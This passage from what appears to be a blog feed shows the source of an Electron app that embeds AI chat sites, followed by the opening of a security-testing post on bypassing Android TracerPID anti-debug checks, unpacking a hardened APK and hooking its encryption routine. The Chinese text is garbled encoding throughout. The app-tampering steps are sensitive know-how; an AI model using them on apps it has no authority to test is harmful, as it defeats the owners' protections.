class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;google&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/google.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;google&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon-img&quot;</span>&gt;</span> Google Gemini</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;icon-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;poe&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/poe.svg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;poe&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon-img&quot;</span>&gt;</span> Quora Poe</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;icon-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;tenxun&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/tenxun.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;tenxun&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon-img&quot;</span>&gt;</span> è…¾è®¯ å…ƒå®</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;icon-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;wxyy&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/wxyy.ico&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;wxyy&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon-img&quot;</span>&gt;</span> ç™¾åº¦ æ–‡å¿ƒä¸€è¨€</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">&lt;!-- è®¾ç½®é€‰é¡¹åˆ—è¡¨ --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;settings-list&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;settings-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;home-btn&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/home.svg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Night Mode Icon&quot;</span>&gt;</span> å›åˆ°ä¸»é¡µ</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;settings-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;set-proxy-btn&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/network.svg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Language Icon&quot;</span>&gt;</span> ç½‘ç»œè®¾ç½®</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;settings-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;manual-btn&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/manual.svg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Settings Icon&quot;</span>&gt;</span> ç”¨æˆ·æ‰‹å†Œ</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;settings-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;version-btn&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/version.svg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Version Icon&quot;</span>&gt;</span> å…³äºç¨‹åº</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- å³è¾¹æ˜¾ç¤ºåŒºåŸŸ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- ä½¿ç”¨webviewåŠ è½½ï¼Œé»˜è®¤åŠ è½½second.htmlé¡µé¢ --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">webview</span> <span class="attr">id</span>=<span class="string">&quot;webview&quot;</span> <span class="attr">src</span>=<span class="string">&quot;second.html&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 100%; height: 100vh;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">webview</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--- å¼•å…¥æ¸²æŸ“è¿›ç¨‹æ–‡ä»¶ renderer.js--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/renderer.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><blockquote><p>renderer.js åˆ†æ</p></blockquote><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*********************** æ¸²æŸ“è¿›ç¨‹ä¸»é€»è¾‘ (renderer.js) ***********************/</span></span><br><span class="line"><span class="comment">/* æœ¬æ–‡ä»¶åŠŸèƒ½ï¼šæ§åˆ¶ç•Œé¢äº¤äº’ä¸ WebView å†…å®¹åŠ è½½ï¼Œé€šè¿‡é¢„åŠ è½½è„šæœ¬ä¸ä¸»è¿›ç¨‹é€šä¿¡ */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------- WebView å…ƒç´ è·å– ---------------------*/</span></span><br><span class="line"><span class="comment">// è·å–ç”¨äºæ˜¾ç¤ºç½‘é¡µå†…å®¹çš„ WebView å®¹å™¨ï¼Œåœ¨index.htmlä¸­å·²å¼•å…¥è¯¥æ–‡ä»¶ï¼ˆéœ€ä¸»è¿›ç¨‹å¯ç”¨ webviewTagï¼‰</span></span><br><span class="line"><span class="keyword">const</span> webview = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;webview&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------- ä¾§è¾¹æ æ¨¡å‹åˆ‡æ¢åŠŸèƒ½ -------------------*/</span></span><br><span class="line"><span class="comment">// åŠŸèƒ½è¯´æ˜ï¼šç‚¹å‡»ä¸åŒ AI æ¨¡å‹æŒ‰é’®æ—¶ï¼Œåˆ‡æ¢ WebView åŠ è½½çš„ç›®æ ‡ URL</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* è·å–æ‰€æœ‰ AI æ¨¡å‹æŒ‰é’®å…ƒç´ ï¼ˆæ¯ä¸ªæŒ‰é’®å¯¹åº”ä¸€ä¸ª AI æœåŠ¡ï¼‰ */</span></span><br><span class="line"><span class="comment">// æœˆä¹‹æš—é¢ Kimi æŒ‰é’®ï¼Œå…ƒç´  kimi å¯¹åº”ï¼Œindex.html ä¸­çš„ &lt;button id=&quot;kimi&quot;&gt; å…ƒç´ </span></span><br><span class="line"><span class="keyword">const</span> kimiButton = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;kimi&#x27;</span>);</span><br><span class="line"><span class="comment">// ...å…¶ä»–æŒ‰é’®å®šä¹‰ï¼ˆç»“æ„ç›¸åŒï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä¸ºæ¯ä¸ªæ¨¡å‹æŒ‰é’®ç»‘å®šç‚¹å‡»äº‹ä»¶ */</span></span><br><span class="line"><span class="comment">// Kimi æŒ‰é’®ç‚¹å‡»äº‹ä»¶ï¼šç”¨æˆ·ç‚¹å‡»index.htmlä¸­çš„ kimi å…ƒç´ ï¼Œrenderer.js æ¥æ”¶åˆ°ä¿¡å·ï¼ŒåŠ è½½å®˜æ–¹é¡µé¢</span></span><br><span class="line">kimiButton.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  webview.<span class="title function_">setAttribute</span>(<span class="string">&#x27;src&#x27;</span>, <span class="string">&quot;https://kimi.moonshot.cn/&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...å…¶ä»–æŒ‰é’®äº‹ä»¶ç›‘å¬é€»è¾‘ï¼ˆæ¨¡å¼ç›¸åŒï¼ŒåŠ è½½å¯¹åº”æœåŠ¡ URLï¼‰</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------- ä¾§è¾¹æ è®¾ç½®åŠŸèƒ½ -----------------------*/</span></span><br><span class="line"><span class="comment">// åŠŸèƒ½è¯´æ˜ï¼šå¤„ç†è®¾ç½®ç›¸å…³æŒ‰é’®çš„ç‚¹å‡»äº‹ä»¶ï¼ˆä¸»é¡µ/æ‰‹å†Œ/ä»£ç†/ç‰ˆæœ¬ï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* è·å–è®¾ç½®æŒ‰é’®å…ƒç´  */</span></span><br><span class="line"><span class="keyword">const</span> homeBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;home-btn&#x27;</span>);       <span class="comment">// ä¸»é¡µæŒ‰é’®</span></span><br><span class="line"><span class="keyword">const</span> setProxyBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;set-proxy-btn&#x27;</span>); <span class="comment">// ä»£ç†æŒ‰é’®</span></span><br><span class="line"><span class="keyword">const</span> manualBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;manual-btn&#x27;</span>);   <span class="comment">// æ‰‹å†ŒæŒ‰é’®</span></span><br><span class="line"><span class="keyword">const</span> versionBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;version-btn&#x27;</span>); <span class="comment">// ç‰ˆæœ¬æŒ‰é’®</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä¸»é¡µæŒ‰é’®ç‚¹å‡»äº‹ä»¶ï¼šåŠ è½½æœ¬åœ° second.html é¡µé¢ */</span></span><br><span class="line">homeBtn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  webview.<span class="property">src</span> = <span class="string">&#x27;second.html&#x27;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ç”¨æˆ·æ‰‹å†ŒæŒ‰é’®ç‚¹å‡»äº‹ä»¶ï¼šåŠ è½½æœ¬åœ° PDF æ–‡ä»¶ */</span></span><br><span class="line">manualBtn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  webview.<span class="property">src</span> = <span class="string">&#x27;../../assets/Readme.pdf&#x27;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä»£ç†è®¾ç½®æŒ‰é’®ç‚¹å‡»äº‹ä»¶ï¼šé€šè¿‡é¢„åŠ è½½è„šæœ¬ä¸ä¸»è¿›ç¨‹é€šä¿¡ */</span></span><br><span class="line">setProxyBtn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// è°ƒç”¨é¢„åŠ è½½è„šæœ¬æš´éœ²çš„ openProxyDialog æ–¹æ³•</span></span><br><span class="line">  <span class="comment">// é€šä¿¡æµç¨‹ï¼šæ¸²æŸ“è¿›ç¨‹ -&gt; preload.js -&gt; ä¸»è¿›ç¨‹ ipcMain -&gt; åˆ›å»ºä»£ç†çª—å£</span></span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">electron</span>.<span class="title function_">openProxyDialog</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ç‰ˆæœ¬ä¿¡æ¯æŒ‰é’®ç‚¹å‡»äº‹ä»¶ï¼šé€šè¿‡é¢„åŠ è½½è„šæœ¬ä¸ä¸»è¿›ç¨‹é€šä¿¡ */</span></span><br><span class="line">versionBtn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// è°ƒç”¨é¢„åŠ è½½è„šæœ¬æš´éœ²çš„ openVersionDialog æ–¹æ³•</span></span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">electron</span>.<span class="title function_">openVersionDialog</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><blockquote><p> preload.js åˆ†æ</p></blockquote><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * é¢„åŠ è½½è„šæœ¬ (preload.js)</span></span><br><span class="line"><span class="comment"> * ä½œç”¨ï¼šåœ¨æ¸²æŸ“è¿›ç¨‹å’Œä¸»è¿›ç¨‹ä¹‹é—´å»ºç«‹å®‰å…¨å¯æ§çš„é€šä¿¡æ¡¥æ¢</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¼å…¥ Electron æ¨¡å—</span></span><br><span class="line"><span class="keyword">const</span> &#123; contextBridge, ipcRenderer &#125; = <span class="built_in">require</span>(<span class="string">&quot;electron&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ä½¿ç”¨ä¸Šä¸‹æ–‡æ¡¥æ¥æŠ€æœ¯å®‰å…¨æš´éœ² IPC æ–¹æ³•åˆ°æ¸²æŸ“è¿›ç¨‹</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contextBridge.<span class="title function_">exposeInMainWorld</span>(<span class="string">&quot;electron&quot;</span>, &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * æ‰“å¼€ä»£ç†è®¾ç½®çª—å£</span></span><br><span class="line"><span class="comment">   * é€šä¿¡æµç¨‹ï¼š</span></span><br><span class="line"><span class="comment">   * æ¸²æŸ“è¿›ç¨‹ -&gt; preload.js -&gt; ä¸»è¿›ç¨‹ (ipcMain.handle(&#x27;open-proxy-dialog&#x27;))</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">openProxyDialog</span>: <span class="function">() =&gt;</span> ipcRenderer.<span class="title function_">invoke</span>(<span class="string">&#x27;open-proxy-dialog&#x27;</span>),</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * è®¾ç½®ç½‘ç»œä»£ç†</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; <span class="variable">proxyAddress</span> - ä»£ç†åœ°å€ (æ ¼å¼ï¼šhost:port)</span></span><br><span class="line"><span class="comment">   * é€šä¿¡æµç¨‹ï¼š</span></span><br><span class="line"><span class="comment">   * æ¸²æŸ“è¿›ç¨‹ -&gt; ä¸»è¿›ç¨‹ (ipcMain.handle(&#x27;set-proxy&#x27;))</span></span><br><span class="line"><span class="comment">   * ä¸»è¿›ç¨‹é€šè¿‡ session.setProxy åº”ç”¨ä»£ç†è®¾ç½®</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">setProxy</span>: <span class="function">(<span class="params">proxyAddress</span>) =&gt;</span> ipcRenderer.<span class="title function_">invoke</span>(<span class="string">&#x27;set-proxy&#x27;</span>, proxyAddress),</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * æ¸…é™¤ä»£ç†è®¾ç½®</span></span><br><span class="line"><span class="comment">   * é€šä¿¡æµç¨‹ï¼š</span></span><br><span class="line"><span class="comment">   * æ¸²æŸ“è¿›ç¨‹ -&gt; ä¸»è¿›ç¨‹ (ipcMain.handle(&#x27;clear-proxy&#x27;))</span></span><br><span class="line"><span class="comment">   * ä¸»è¿›ç¨‹é€šè¿‡ session.setProxy(&#123;&#125;) é‡ç½®ä»£ç†</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">clearProxy</span>: <span class="function">() =&gt;</span> ipcRenderer.<span class="title function_">invoke</span>(<span class="string">&#x27;clear-proxy&#x27;</span>),</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * æ‰“å¼€ç‰ˆæœ¬ä¿¡æ¯çª—å£</span></span><br><span class="line"><span class="comment">   * é€šä¿¡æµç¨‹ï¼š</span></span><br><span class="line"><span class="comment">   * æ¸²æŸ“è¿›ç¨‹ -&gt; ä¸»è¿›ç¨‹ (ipcMain.handle(&#x27;open-version-dialog&#x27;))</span></span><br><span class="line"><span class="comment">   * ä¸»è¿›ç¨‹åˆ›å»º about çª—å£</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">openVersionDialog</span>: <span class="function">() =&gt;</span> ipcRenderer.<span class="title function_">invoke</span>(<span class="string">&#x27;open-version-dialog&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><h4 id="3-2-5-è‡ªå®šä¹‰"><a href="#3-2-5-è‡ªå®šä¹‰" class="headerlink" title="3.2.5 è‡ªå®šä¹‰"></a>3.2.5 è‡ªå®šä¹‰</h4><p>è‹¥éœ€è¦åŠ å…¥ä¸ªäººä¹ æƒ¯çš„ç¨‹åºï¼Œ åªéœ€ä¿®æ”¹ä¸¤éƒ¨åˆ†ä»£ç å³å¯</p><p>1ï¼‰index.html ä¸­çš„ <div class="ai_module"> ä¸­æ·»åŠ ä¸€ä¸ª <div class="icon-item"></p><p><a data-fancybox="gallery" data-src="/../images/ai/ai_talk/2.png" data-caption="2"><img src="/../images/ai/ai_talk/2.png" alt="2"></a></p><p>2ï¼‰renderer.js ä¸­æ·»åŠ  index çš„æŒ‰é’®å…ƒç´ ä»¥åŠéœ€è¦åŠ è½½çš„é“¾æ¥å³å¯</p><p><a data-fancybox="gallery" data-src="/../images/ai/ai_talk/3.png" data-caption="3"><img src="/../images/ai/ai_talk/3.png" alt="3"></a></p><p>ä¾‹å­ï¼šæ·»åŠ  deepseek å¤§æ¨¡å‹</p><p>1ï¼‰ä¿®æ”¹ index.html æ·»åŠ  deepseek æŒ‰é’®å…ƒç´ </p><p><a data-fancybox="gallery" data-src="/../images/ai/ai_talk/4.png" data-caption="4"><img src="/../images/ai/ai_talk/4.png" alt="4"></a></p><p>2ï¼‰renderer.js ä¸­æ·»åŠ index.html æŒ‰é’®å…ƒç´ ï¼Œå¹¶æŒ‡å®šè·³è½¬çš„ url</p><p><a data-fancybox="gallery" data-src="/../images/ai/ai_talk/5.png" data-caption="5"><img src="/../images/ai/ai_talk/5.png" alt="5"></a></p><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><p>æœ¬é¡¹ç›®åŸºäºä¸ªäººä½¿ç”¨ä¹ æƒ¯é©±åŠ¨ï¼ŒAi æ—¶ä»£ï¼Œç®€å•çš„é‡å¤æ€§å’Œæ–‡å­—æ€§çš„å·¥ä½œä¸åº”è¯¥æµªè´¹æˆ‘ä»¬çš„æ—¶é—´ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> åº”ç”¨å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
            <tag> å¼€å‘è®°å½• </tag>
            
            <tag> å¼€æº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APPæµ‹è¯•ç³»åˆ—-ç»•è¿‡TracerPIDæ£€æµ‹ HookåŠ å¯†æ•°æ®</title>
      <link href="/2025/01/19/APP%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97-%E7%BB%95%E8%BF%87%20TracerPID%20%E6%A3%80%E6%B5%8B%20Hook%20%E5%8A%A0%E5%AF%86%E6%95%B0%E6%8D%AE/"/>
      <url>/2025/01/19/APP%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97-%E7%BB%95%E8%BF%87%20TracerPID%20%E6%A3%80%E6%B5%8B%20Hook%20%E5%8A%A0%E5%AF%86%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote><p>è¯´æ¥æƒ­æ„§ï¼Œç«™å†…æ–‡ç« å¤šæœˆæœªæ›´ï¼Œå®¢å®˜æŠ±æ­‰ï¼Œåç»­ä¼šé€æ­¥æ¢å¤æ›´æ–°ã€‚æ­¤æ–‡ç« é¦–å‘ Seebug Paper <a href="https://paper.seebug.org/3215/">https://paper.seebug.org/3215/</a> è½¬è½½è¯·æ³¨æ˜æ¥æºã€‚</p></blockquote><h2 id="ä¸€ã€èµ·å› "><a href="#ä¸€ã€èµ·å› " class="headerlink" title="ä¸€ã€èµ·å› "></a>ä¸€ã€èµ·å› </h2><p>åœ¨å¯¹æŸä¸€ APP è¿›è¡Œæµ‹è¯•æ—¶ï¼Œå‘ç°è¯¥ APP å¯¹ä¼ è¾“çš„æ•°æ®åŒ…è¿›è¡Œäº†åŠ å¯†ï¼Œè¿‘å‡ å¹´ APP æ–¹é¢çš„é˜²æŠ¤ä¹Ÿé€æ¸æé«˜ï¼Œå¤§å‹ä¼ä¸šçš„ APP ä¼ è¾“æ•°æ®åŒ…åŠ å¯†ä¹Ÿæ˜¯å¸¸è§„æ“ä½œäº†ï¼Œåœ¨å°è¯•è¿›è¡Œ Hook æ—¶å‡ºç°äº†æŠ¥é”™ï¼Œå…¶ä¸­çš„æŠ¥é”™ä¿¡æ¯å¼•å‡ºäº†è¯¥æ–‡ã€‚æœ¬æ–‡ä¸»è¦å†…å®¹ä¸ºé€šè¿‡ä¿®æ”¹ Android å†…æ ¸æ–‡ä»¶ä»è€Œå®ç°ç»•è¿‡ TracerPID æ£€æµ‹è¿›è€Œ Hook åŠ å¯†æ•°æ®ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/1.png" data-caption="1"><img src="/../images/app/TracerPID/1.png" alt="1"></a></p><h2 id="äºŒã€åˆ†æ"><a href="#äºŒã€åˆ†æ" class="headerlink" title="äºŒã€åˆ†æ"></a>äºŒã€åˆ†æ</h2><p>å¯¹è¯¥ APP è¿›è¡ŒæŠ“åŒ…æ—¶ï¼Œå‘ç° APP è¯·æ±‚æ•°æ®åŒ…ä»¥åŠè¿”å›åŒ…å‡ä½œäº†åŠ å¯†å¤„ç†ï¼Œçœ‹åˆ°æ•°æ®åŠ å¯†ï¼Œæœ¬èƒ½ååº”åç¼–è¯‘æŸ¥çœ‹æºç ï¼Œå®šä½åŠ å¯†ç®—æ³•ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/2.png" data-caption="2"><img src="/../images/app/TracerPID/2.png" alt="2"></a></p><p>å°† APK æ‹–è¿› GDA åç¼–è¯‘ï¼Œä¸‹è½½åœ°å€ï¼š<a href="http://www.gda.wiki:9090/%EF%BC%8CAPP">http://www.gda.wiki:9090/ï¼ŒAPP</a> å·²è¢«åŠ å›ºã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/3.png" data-caption="3"><img src="/../images/app/TracerPID/3.png" alt="3"></a></p><p>è„±å£³åè·å–åˆ°å¤šä¸ª dexï¼Œå°† dex æ‰“åŒ…åœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹åæ‹‰å…¥GDA è¿›è¡Œåˆ†æï¼Œæ ¹æ®ä¸Šé¢åŠ å¯†çš„ç‰¹å¾æœç´¢ xxxKey å…³é”®å­—å®šä½ç®—æ³•ä½ç½®ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/TracerPID/4.png" data-caption="4"><img src="/../images/app/TracerPID/4.png" alt="4"></a></p><p>ä»£ç å¦‚ä¸‹ï¼Œæ ¹æ®å®šä½å¯çŸ¥ str &#x3D; xxxDES3Util.encode(str); æ•°æ®ä¼ è¾“ä½¿ç”¨äº† xxxDES3Util.encode() æ–¹æ³•ï¼Œå¯ä»¥å…ˆå¯¹è¯¥æ–¹æ³•è¿›è¡Œ Hook æŸ¥çœ‹å…¶å‡½æ•°è¾“å‡ºçš„æ•°æ®æ˜¯ä»€ä¹ˆã€‚</p><p><a data-fancybox="gallery" 